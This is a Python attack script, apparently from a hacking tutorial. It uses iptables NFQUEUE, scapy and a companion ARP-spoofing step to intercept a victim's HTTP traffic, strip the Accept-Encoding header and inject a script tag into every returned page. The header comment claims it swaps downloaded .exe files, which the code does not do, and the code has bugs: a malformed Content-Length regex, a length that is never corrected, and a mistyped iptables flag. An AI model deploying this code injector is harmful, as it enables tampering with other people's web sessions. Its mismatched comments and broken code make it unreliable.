#!/usr/bin/env python

# This script replaces the downloading .exe with the file in hacker machine

# Run from the Linux machine with netfilterqueue python module
# Run the linux command first to capture local input and output traffic -
# iptables -I INPUT -j NFQUEUE --queue-num 0
# iptables -I OUTPUT -j NFQUEUE --queue-num 0
# Run the linux command if the target is a remote machine
# iptables -I FORWARD -j NFQUEUE ---queue-num 0
# Also run the arp_spoof.py for remote machine
# When done, run - iptables --flush

import netfilterqueue
import scapy.all as scapy
import re

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport ==80:
            print("[+] Request")
            load = re.sub("Accept-Encoding:.*?\\r\\n", '', load)

        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] Response")
            load = scapy_packet[scapy.Raw].load.replace("</body>", "<script>alert('Test');</script></body>")
            content_length_search = re.search("(?:Content-Length:/s)(\d*)", load)
            if content_length_search:
                content_length = content_length_search.group(1)
                print(content_length)

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))

    packet.accept()

queue =  netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

